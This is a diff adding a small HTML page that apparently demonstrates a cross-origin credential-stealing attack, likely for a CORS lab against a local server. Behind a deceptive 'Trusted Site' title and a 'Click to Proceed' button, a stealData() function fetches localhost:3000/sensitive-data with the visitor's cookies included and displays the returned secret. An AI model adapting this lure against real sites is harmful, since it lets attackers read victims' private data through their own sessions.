@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Trusted Site</title>
+</head>
+<body>
+    <h1>Welcome to Secure Site</h1>
+    <button onclick="stealData()">Click to Proceed</button>
+    <p id="output"></p>
+
+    <script>
+        function stealData() {
+            fetch("http://localhost:3000/sensitive-data", {
+                method: "GET",
+                credentials: "include"
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("output").innerHTML = `<p>${data.secret}</p>`;
+            })
+            .catch(error => console.error("Attack failed:", error));
+        }
+    </script>
+</body>
+</html>
